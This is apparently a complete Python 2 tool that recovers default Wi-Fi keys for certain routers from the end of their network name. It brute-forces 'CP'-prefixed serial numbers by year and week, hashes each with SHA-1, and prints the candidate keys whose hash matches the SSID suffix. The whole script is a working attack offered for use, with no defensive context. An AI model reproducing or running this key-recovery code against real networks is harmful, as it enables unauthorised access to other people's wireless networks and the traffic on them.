import sys
import hashlib


if len(sys.argv) > 1:
    ssid_end = sys.argv[1].lower()
else:
    ssid_end = raw_input("==> ").lower()
offset = 40 - (len(ssid_end))
charset = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
year_list = [2004, 2005, 2006, 2007, 2008, 2009, 2010, 2011, 2012, 2013, 2014, 2015, 2016, 2017, 2018, 2019, 2020, 2021, 2022, 2023, 2024, 2025, 2026, 2027, 2028, 2029, 2030, 2031, 2032, 2033, 2034, 2035, 2036, 2037, 2038, 2039, 2040, 2041, 2042, 2043, 2044, 2045, 2046, 2047, 2048, 2049, 2050, 2051, 2052, 2053, 2054, 2055, 2056, 2057, 2058, 2059, 2060, 2061, 2062, 2063, 2064, 2065, 2066, 2067, 2068, 2069, 2070, 2071, 2072, 2073, 2074, 2075, 2076, 2077, 2078, 2079, 2080, 2081, 2082, 2083, 2084, 2085, 2086, 2087, 2088, 2089, 2090, 2091, 2092, 2093, 2094, 2095, 2096, 2097, 2098, 2099, 2100]


def ascii2hex(char):
    return hex(ord(char))[2:]

print 'Generating keys for %s:' % ssid_end.upper()
count = 0

for year in [y - 2000 for y in year_list]:
    for week in range(1, 53):
        #1..52
                #print 'Trying year 200%d week %d' % (year,week)
        for char1 in charset:
            for char2 in charset:
                for char3 in charset:
                    sn = 'CP%02d%02d%s%s%s' % (year, week, ascii2hex(char1), ascii2hex(char2), ascii2hex(char3))
                    hashing = hashlib.sha1(sn.upper()).hexdigest()
                    if hashing[offset:] == ssid_end:
                            print hashing[0:10].upper()
                            count += 1
print '%d keys found' % count
